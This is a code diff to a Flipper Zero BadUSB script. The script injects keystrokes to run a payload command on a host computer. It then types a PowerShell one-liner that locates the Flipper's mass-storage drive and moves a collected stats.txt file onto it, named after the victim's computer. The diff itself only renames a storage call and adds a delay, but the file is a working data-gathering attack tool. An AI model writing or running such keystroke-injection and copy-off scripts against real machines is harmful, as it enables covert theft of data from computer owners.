@@ -17,7 +17,7 @@ let usbdisk = require("usbdisk");
 let storage = require("storage");
 
 print("Checking for Image...");
-if (storage.exists(image)) {
+if (storage.fileExists(image)) {
     print ("Storage Exists.");
 }
 else {
@@ -37,6 +37,7 @@ badusb.press("i");
 delay(3000);
 print("Running payload");
 badusb.println(command, 10);
+delay(2000);
 badusb.press("ENTER");
 badusb.println("echo 'Please wait until this Window closes to eject the disk!'; Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path stats.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; exit")
 badusb.press("ENTER");
